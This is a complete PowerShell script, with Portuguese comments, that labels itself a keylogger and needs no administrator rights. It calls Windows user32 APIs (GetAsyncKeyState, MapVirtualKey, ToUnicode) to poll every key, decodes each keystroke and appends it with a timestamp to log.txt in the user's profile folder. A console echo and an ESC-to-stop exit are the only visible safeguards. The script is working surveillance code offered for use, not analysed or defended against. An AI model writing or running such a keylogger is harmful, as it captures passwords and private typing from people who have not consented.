Clear-Host
Write-Host "=== (Modo Sem Admin) ===" -ForegroundColor Green

# Usa pasta do usuário atual (não precisa de admin)
$arquivo = "$env:USERPROFILE\log.txt"

"=== Keylogger iniciado em $(Get-Date) ===" | Out-File -FilePath $arquivo -Encoding UTF8 -Force

# Declaração das APIs
$signature = @"
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);

[DllImport("user32.dll")]
public static extern int MapVirtualKey(uint uCode, uint uMapType);

[DllImport("user32.dll")]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

Add-Type -MemberDefinition $signature -Name "Win32" -Namespace "API" -PassThru | Out-Null

$keyState = New-Object byte[] 256

try {
    while ($true) {
        Start-Sleep -Milliseconds 25

        for ($vk = 8; $vk -le 254; $vk++) {
            if ([API.Win32]::GetAsyncKeyState($vk) -eq -32767) {

                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $tecla = ""

                switch ($vk) {
                    8   { $tecla = "[BACKSPACE]" }
                    9   { $tecla = "[TAB]" }
                    13  { $tecla = "[ENTER]" }
                    27  { $tecla = "[ESC]" }
                    32  { $tecla = "[ESPACO]" }
                    46  { $tecla = "[DELETE]" }
                    default {
                        $mapped = [API.Win32]::MapVirtualKey($vk, 0)
                        $buffer = New-Object System.Text.StringBuilder 5
                        $result = [API.Win32]::ToUnicode($vk, $mapped, $keyState, $buffer, 5, 0)
                        
                        if ($result -gt 0) {
                            $tecla = $buffer.ToString()
                        } else {
                            $tecla = "[VK:$vk]"
                        }
                    }
                }

                "$timestamp | $tecla" | Add-Content -Path $arquivo -Encoding UTF8
                Write-Host "$timestamp → $tecla" -ForegroundColor Green

                if ($vk -eq 27) {
                    "=== Encerrado em $(Get-Date) ===" | Add-Content -Path $arquivo -Encoding UTF8
                    Write-Host "`nParado pelo ESC." -ForegroundColor Red
                    exit
                }
            }
        }
    }
}
catch {
    "Erro: $($_.Exception.Message)" | Add-Content -Path $arquivo -Encoding UTF8
}
